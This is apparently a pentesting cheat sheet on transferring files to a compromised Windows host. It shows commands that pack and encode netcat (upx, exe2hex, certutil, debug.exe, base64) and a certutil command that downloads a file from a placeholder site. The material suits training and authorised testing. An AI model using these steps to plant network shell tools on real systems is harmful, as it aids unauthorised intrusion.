# ⭕ Encode / Decode Files

## Base 64 encode/decode

#### Linux

```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```

#### Windows

```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

## Windows Downloads with exe2hex and PowerShell

```
cp /usr/share/windows-resources/binaries/nc.exe .

upx -9 nc.exe  >>> decrease the file size by 50%
```

#### convert nc.exe to a Windows script (.cmd) to run on the Windows machine, which will convert the file to hex and instruct powershell.exe to assemble it back into binary

```
exe2hex -x nc.exe -p nc.cmd
```

copy to clipboard directly:

```
cat nc.cmd | xclip -selection clipboard
```

paste it into the windows shell

## Certutil

Base64 encode the binary file outside

```
$raw = Get-Content -Path c:\nc.exe -Encoding Byte
$b64 = [System.Convert]::ToBase64String($raw)
$begin= "-----BEGIN CERTIFICATE-----"
$end = "-----END CERTIFICATE-----"
"$begin$b64$end" | Out-File c:\nc.txt
```

Download via Notepad; certutil to write:

```
certutil.exe -decode nc.txt nc.exe
```

we can use certutils cache feature to download the file:

```
certutil.exe –urlcache -split –f "http://SITE/nc.crt" nc.txt
```

## debug.exe

This is a crazy technique that works on windows 32 bit machines. Basically the idea is to use the debug.exe program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like netcat. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with debug.exe.

Debug.exe can only assemble 64 kb. So we need to use files smaller than that. We can use upx to compress it even more. So let's do that:

```
upx -9 nc.exe
```

Now it only weights 29 kb. Perfect. So now let's disassemble it:

```
wine exe2bat.exe nc.exe nc.txt
```

Now we just copy-past the text into our windows-shell. And it will automatically create a file called nc.exe

## Base 64 Encoding + Copy & Paste

The trick is by first encoding the file in Base 64. We can do this by using Python:

```
python -c 'print(__import__("base64").b64encode(open("file", "rb").read()))'
```

Then, on the target, we can copy and paste the string into a .txt file with

```
echo "string" > output.txt
```

and use base64 to decode the file, with

```
base64 -d output.txt > output-file
```

If Python is available, you can also run

```
python -c 'print(__import__("base64").b64decode(open("string.txt", "r").read()))' > out-file
```
